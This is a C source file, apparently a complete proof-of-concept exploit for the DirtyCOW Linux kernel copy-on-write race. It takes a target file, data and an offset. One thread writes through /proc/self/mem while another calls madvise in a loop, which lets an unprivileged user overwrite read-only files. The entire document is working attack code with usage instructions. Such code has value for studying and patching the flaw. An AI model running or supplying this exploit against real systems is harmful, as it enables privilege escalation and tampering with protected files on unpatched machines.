#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>

void *mapping;
char *datptr;
int offset = 0;
int len = 0;

void *throwVirtMap(){
	int i;
	for (i = 0; i < 10000; ++i){
		madvise(mapping, 1, MADV_DONTNEED);
	}
}

void *writeToMem(){
	int i;
	int procmem = open("/proc/self/mem", O_RDWR);
	for (i = 0; i < 10000; ++i){
		lseek(procmem, (off_t)mapping+offset, SEEK_SET);
		write(procmem, datptr, len);
	}
}

int main(int argc, char *argv[]){
	if (argc < 3){
		printf("DirtyCOW PoC - th3_5had0w on 15th November 2020\n");
		printf("Usage: %s <file_to_be_written_to> <data_to_be written> <offset_to_be_written_at>\n", argv[0]);
		printf("The offset parameter is optional, you can set it or not. By default, offset is 0\n");
		exit(1);
	}
	if (argc == 4){
		offset = atoi(argv[3]);
	}
	int bin;
	struct stat fileinfo;
        pthread_t t1, t2;
	char *file;

	file = argv[1];
	len = strlen(argv[2]);
	datptr = calloc(len, 0x1);
	memcpy(datptr, argv[2], len);
	bin = open(file, O_RDONLY);
	if (bin == -1){
		printf("crashed at open\n");
		exit(-1);
	}
	if (fstat(bin, &fileinfo) == -1){
		printf("crashed at getting file info\n");
		exit(-1);
	}
	mapping = mmap(NULL, fileinfo.st_size, PROT_READ, MAP_PRIVATE, bin, 0);
	pthread_create(&t1, NULL, writeToMem, NULL);
	pthread_create(&t2, NULL, throwVirtMap, NULL);
	pthread_join(t1, NULL);
	pthread_join(t2, NULL);
}
